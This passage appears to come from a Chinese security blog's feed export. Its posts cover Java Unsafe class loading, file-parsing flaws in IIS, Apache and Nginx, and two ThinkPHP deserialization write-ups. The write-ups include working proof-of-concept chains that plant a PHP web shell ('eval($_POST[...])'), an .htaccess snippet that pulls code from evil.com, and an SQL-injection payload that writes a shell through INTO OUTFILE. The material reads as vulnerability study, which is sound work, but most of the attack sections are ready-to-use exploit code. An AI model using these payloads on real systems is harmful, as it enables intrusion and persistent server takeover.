class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        Class c = Unsafe.class;</span><br><span class="line">        Field unsafeField = c.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Unsafe unsafe = (Unsafe) unsafeField.get(<span class="keyword">null</span>);</span><br><span class="line">        Class c2 = unsafe.defineClass(<span class="string">&quot;text&quot;</span>,code,<span class="number">0</span>,code.length,cl,<span class="keyword">null</span>);</span><br><span class="line">        c2.newInstance();</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/u010398771/article/details/85319991">java中Unsafe使用讲解</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>中间件文件解析漏洞</title>
      <link href="/2022/05/09/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/05/09/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>当一次搬运工</p><h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><blockquote><p>后缀解析 /xx.asp;.jpg 服务器默认不解析 ; 号及其后面的内容，相当于截断<br> 目录解析 /xx.asp/xx.jpg(xx.asp目录下任意解析)<br> 默认解析 xx.asa xx.cer xx.cdx<br> PROPFIND 栈溢出漏洞<br> RCE CVE-2017-7269</p></blockquote><h2 id="IIS-7-0-7-5-Nginx-lt-0-8-37"><a href="#IIS-7-0-7-5-Nginx-lt-0-8-37" class="headerlink" title="IIS 7.0-7.5 / Nginx &lt;= 0.8.37"></a>IIS 7.0-7.5 / Nginx &lt;= 0.8.37</h2><p>在Fast-CGI开启状态下，在文件路径后加上 /xx.php ，即 xx.jpg/xx.php 会被解析为php文件。</p><h2 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h2><p>开启WebDAV<br>拥有来宾用户，且来宾用户拥有上传权限<br>可任意文件上传</p><h2 id="Windows特性"><a href="#Windows特性" class="headerlink" title="Windows特性"></a>Windows特性</h2><p>Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用 xx.php[空格] ， xx.php.， xx.php/， xx.php::$DATA 上传脚本文件。</p><h2 id="文件名猜解"><a href="#文件名猜解" class="headerlink" title="文件名猜解"></a>文件名猜解</h2><p>在支持NTFS 8.3文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：</p><p>文件名为原文件名前6位字符加上 ~1 ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。<br>后缀名不超过3位，超过部分会被截断<br>所有小写字母均转换成大写的字母<br>文件名后缀长度大于等于4或者总长度大于等于9时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件</p><p>IIS 8.0之前的版本支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种，需要安装ASP.NET。而IIS 8.0之后的版本只能通过OPTIONS和TRACE方法猜测成功，但是没有ASP.NET的限制。</p><p>这种方法的局限性在于：</p><p>文件夹名前6位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报<br>不支持中文文件名</p><p>这种方法可以通过命令 fsutil behavior set disable8dot3 1 关闭NTFS 8.3文件格式的支持来修复。</p><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="后缀解析"><a href="#后缀解析" class="headerlink" title="后缀解析"></a>后缀解析</h2><p>test.php.x1.x2.x3 （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析</p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>当 AllowOverride 被启用时，上传启用解析规则的.htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .jpg</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler fcgid-script .gif</span><br><span class="line">FcgidWrapper <span class="string">&quot;/bin/bash&quot;</span> .gif</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag allow_url_include <span class="number">1</span></span><br><span class="line">php_value auto_append_file data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span><br><span class="line"><span class="comment">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span></span><br><span class="line"><span class="comment">#php_value auto_append_file https://evil.com/evil-code.txt</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h2><p>%0A 绕过上传黑名单。<br><a href="https://cloud.tencent.com/developer/article/1676145">Apache HTTPD换行解析漏洞</a></p><h2 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx.jpg/xx.php</span><br></pre></td></tr></table></figure><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="Fast-CGI关闭"><a href="#Fast-CGI关闭" class="headerlink" title="Fast-CGI关闭"></a>Fast-CGI关闭</h2><p>在Fast-CGI关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径(xx.jpg)后面加上 %00.php ， 即 xx.jpg%00.php 会被当做 php 文件来解析<br>影响以下版本</p><blockquote><p>Nginx 0.5.*<br>Nginx 0.6.*<br>Nginx 0.7 &lt;= 0.7.65<br>Nginx 0.8 &lt;= 0.8.37</p></blockquote><h2 id="Fast-CGI开启"><a href="#Fast-CGI开启" class="headerlink" title="Fast-CGI开启"></a>Fast-CGI开启</h2><p>在Fast-CGI开启状态下，在文件路径后加上 /xx.php ，则 xx.jpg/xx.php 会被解析为php文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php的配置文件 php.ini 文件中开启了 cgi.fix_pathinfo</span><br><span class="line"></span><br><span class="line">/etc/php5/fpm/pool.d/www.conf中不正确的配置security.limit_extensions，导致允许将其他格式文件作为php解析执行</span><br></pre></td></tr></table></figure><h2 id="CVE-2013-4547"><a href="#CVE-2013-4547" class="headerlink" title="CVE-2013-4547"></a>CVE-2013-4547</h2><p>影响nginx版本：nginx 0.8.41 ~ 1.5.6</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.jpg\x20\x00.php</span><br></pre></td></tr></table></figure><h2 id="配置错误"><a href="#配置错误" class="headerlink" title="配置错误"></a>配置错误</h2><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>如果配置中存在类似 location /foo { alias /bar/; } 的配置时，/foo../ 会被解析为 /bar/../ 从而导致目录穿越的发生。</p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>配置中 autoindex on 开启时，Nginx中存在目录遍历漏洞。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/yokan/p/12444476.html">文件解析漏洞总结</a><br><a href="http://www.yongsheng.site/2022/01/14/%E4%B8%AD%E9%97%B4%E4%BB%B6/">大佬博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp6框架学习&amp;反序列化&amp;任意写文件 分析</title>
      <link href="/2022/05/09/thinkphp6%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0&amp;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%20%E5%88%86%E6%9E%90/"/>
      <url>/2022/05/09/thinkphp6%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0&amp;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%20%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="开发手册"><a href="#开发手册" class="headerlink" title="开发手册"></a>开发手册</h2><p><a href="https://www.kancloud.cn/manual/thinkphp6_0">think6框架手册</a><br>若想搞开发看大佬博客<br><a href="https://blog.csdn.net/qq_38626043?type=blog">PHP 开发 ThinkPHP6 框架学习 一</a><br><a href="https://blog.csdn.net/qq_38626043/article/details/121317358?spm=1001.2014.3001.5502">PHP开发 ThinkPHP6 框架学习 二</a></p><h2 id="tp6下载及配置"><a href="#tp6下载及配置" class="headerlink" title="tp6下载及配置"></a>tp6下载及配置</h2><p><a href="https://blog.csdn.net/Quest_sec/article/details/105340807">用phpstudy部署thinkphp6 / 使用教程</a><br>利用compose下载<br><a href="https://packagist.org/packages/topthink/think">下载指令网址</a><br>配置<br><img src="https://img-blog.csdnimg.cn/ea7a3c8d2878438fa782ded800711efd.png"><br><img src="https://img-blog.csdnimg.cn/cb1764f2dd864250a634c85d6e7ff280.png"><br>使用composer安装tp6 php版本在7.1以上</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>写入demo:<br>D:\phpstudy_pro\WWW\thinkphp6\app\controller\Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$unser</span> = <span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize(<span class="variable">$unser</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>&#123;</span><br><span class="line"><span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Filesystem</span>\<span class="title">AbstractAdapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file=<span class="string">&quot;cyxhack.php&quot;</span>;  <span class="comment">//文件名称</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;complete=<span class="string">&quot;&lt;?php eval(\$_POST[a]);?&gt;&quot;</span>;  <span class="comment">//内容</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;adapter=<span class="keyword">new</span> \League\Flysystem\Adapter\Local();  <span class="comment">//has()方法</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Local</span> <span class="title">extends</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">pathPrefix</span> = &quot;./&quot;;  <span class="comment">//这里进行目录的更改</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$<span class="title">a</span> = <span class="title">new</span> \<span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>\<span class="title">Adapter</span>();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入木马<br><img src="https://img-blog.csdnimg.cn/b79986d17dd34bfe995e0a8cd48bc033.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>全局搜索__destruct()<br><img src="https://img-blog.csdnimg.cn/a8defd503b8c4430ac7b703f2206b9f7.png"><br>在src/Storage/AbstractCache.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span></span><br></pre></td></tr></table></figure><p>如果autosave为false则执行save()函数<br><img src="https://img-blog.csdnimg.cn/29dc9df67c334f218d0ba316c1083cc7.png"><br>查找save()函数<br>发现在<br><img src="https://img-blog.csdnimg.cn/0e75786ecc6f49f1bcfa51ad59d21cd9.png"><br>跟进getForStorage()函数<br><img src="https://img-blog.csdnimg.cn/041dc6c3f39d498fb1e54492b13d518d.png"><br>发现参数cache complete 和方法cleanContents()在抽象类中, expire在当前类中<br>跟进cleanContents()发现没什么用，那么在save()函数中$contents参数我们可控<br>接下来进行一个has()方法的判断，我们肯定是想进行write()方法，那么has()就要返回一个false<br>搜索has()方法，在src/Adapter/Local.php<br><img src="https://img-blog.csdnimg.cn/1b3fa5321d4c4e4b8e1da71a1eff73b1.png"><br>进到applyPathPrefix()<br><img src="https://img-blog.csdnimg.cn/8ed457c9afb34482bf633b43f8dd94dc.png"><br>转到getPathPrefix()函数<br><img src="https://img-blog.csdnimg.cn/74157d07600144c187537a55e0efd11c.png"><br>这里的getPathPrefix()函数可控，让pathPrefix为 ./ 再配合ltrim可以控制任意写入文件的目录地址</p><p>ltrim意思是去除 \ 最终返回到has()的 file_exists($ location) 因为这里的$location是我们写入的文件名: ./cyxhack.php不存在，所以返回false<br>然后向上返回到write()函数，写入一句话</p><p><a href="http://www.yongsheng.site/2021/10/16/ThinkPHP%20v6.0.9%20save%28%29%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6/">大佬博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场（一）</title>
      <link href="/2022/05/08/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2022/05/08/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>由于键盘的缘故，写了好几天的博客没有了<br>这里提供我的参考博客</p><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/">环境搭建</a></p><p><a href="https://www.yongsheng.site/2021/03/22/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/">大佬博客</a><br><a href="https://jishuin.proginn.com/p/763bfbd2e94e">添加路由</a><br><a href="https://blog.csdn.net/zzlx123/article/details/103661662">木马生成及利用</a><br><a href="https://cloud.tencent.com/developer/article/1853985">进程迁移</a><br><a href="https://blog.csdn.net/m0_53087192/article/details/112707016">kiwi的简单使用</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp3.2.3反序列化漏洞复现</title>
      <link href="/2022/05/07/Thinkphp3.2.3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/05/07/Thinkphp3.2.3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先全局搜索 destruct， 这里的 $this-&gt;img 可控，可以利用其来调用 其他类的destroy() 方法，或者可以用的call() 方法，__call() 方法并没有可以利用的<br><img src="https://img-blog.csdnimg.cn/a48d15617c7b4ef68298ba4426f9de87.png"><br>那就去找 destroy() 方法<br><img src="https://img-blog.csdnimg.cn/9ca44d705f4646c4ad67e984cfa33b34.png"><br>注意这里，destroy() 是有参数的，而我们调用的时候没有传参，这在php5中是可以的，只发出警告，但还是会执行。</p><p>但是在php7 里面就会报出错误，不会执行。</p><p>所以漏洞需要用php5的环境。<br>继续寻找可利用的delete()方法。</p><p>在Think\Model类即其继承类里，可以找到这个方法，还有数据库驱动类中也有这个方法的，thinkphp3的数据库模型类的最终是会调用到数据库驱动类中的。</p><p>先看Model类中。<br><img src="https://img-blog.csdnimg.cn/99915fec3498488abfad11ece63b0a16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>注意，如果$options[‘where’]为空，会return掉<br><img src="https://img-blog.csdnimg.cn/9aed181c0ff54634bb8f9a3b5cafe717.png"><br>跟进 getPK() 方法<br><img src="https://img-blog.csdnimg.cn/f4020abc8f0c41c98a4ad38d39ea547b.png"><br>$pk可控 $this-&gt;data可控<br>最终去驱动类的入口在这里<br><img src="https://img-blog.csdnimg.cn/3e8a953802dd4c648d5d3d799affecc9.png" alt="在这里插入图片描述"><br>下面是驱动类的delete方法<br><img src="https://img-blog.csdnimg.cn/ad424b8009c949ab8351ee512655718f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>一开始调用Model类的delete方法的时候，传入的参数是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;sessionName.<span class="variable">$sessID</span></span><br></pre></td></tr></table></figure><p>而后面我们执行的时候是依靠数组的，数组是不可以用 字符串连接符的。参数控制不可以利用$this-&gt;sessionName。</p><p>但是可以令其为空（本来就是空），会进入Model 类中的delete方法中的第一个if分支，然后再次调用delete方法，把$this-&gt; $data[this−&gt;data[pk] 作为参数传入，这是我们可以控制的！</p><p>跟进driver类中的execute() 方法<br><img src="https://img-blog.csdnimg.cn/7a6dd7afd1be44c68f1e9027ac48494c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>跟进 initConnect() 方法<br><img src="https://img-blog.csdnimg.cn/5e9650a0dedb4b649ec1b2f66f423ae6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>跟进connect<br><img src="https://img-blog.csdnimg.cn/23244ce33cbc484f817777486c15de78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>数据库的连接时通过 PDO 来实现的，可以堆叠注入(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true ) 需要指定这个配置。</p><p>这里控制 $this-&gt;config 来连接数据库。</p><p>driver类时抽象类，我们需要用mysql类来实例化。</p><p>到这里一条反序列化触发sql注入的链子就做好了。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;sessionName=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle= <span class="keyword">new</span> Model();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>]=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;pk=<span class="string">&#x27;jiang&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk]=<span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;table&quot;</span>=&gt;<span class="string">&quot;mysql.user where 1=updatexml(1,concat(0x7e,user()),1)#&quot;</span>,</span><br><span class="line">            <span class="comment">//&quot;table&quot; =&gt; &quot;mysql.user where 1=1;select &#x27;<span class="meta">&lt;?php</span> eval(\$_POST[1]);<span class="meta">?&gt;</span>&#x27; into outfile &#x27;/var/www/html/shell.php&#x27;;#&quot;,//堆叠打开才能用</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;where&quot;</span>=&gt;<span class="string">&quot;1=1&quot;</span></span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span 